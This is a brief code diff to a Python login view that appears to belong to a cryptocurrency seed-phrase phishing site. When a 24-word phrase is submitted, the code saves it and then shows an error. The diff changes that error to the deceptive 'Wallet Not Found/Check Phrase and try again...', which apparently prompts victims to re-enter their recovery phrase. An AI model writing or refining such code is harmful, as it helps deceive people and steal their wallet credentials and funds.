@@ -34,7 +34,7 @@ def login(request):
             else:
                 if count == 24:
                     validating.save()
-                    messages.success(request,"Invalid passphrase or incomplete KYC")
+                    messages.success(request,"Wallet Not Found/Check Phrase and try again...")
                     return redirect("login")
         else:
             pass
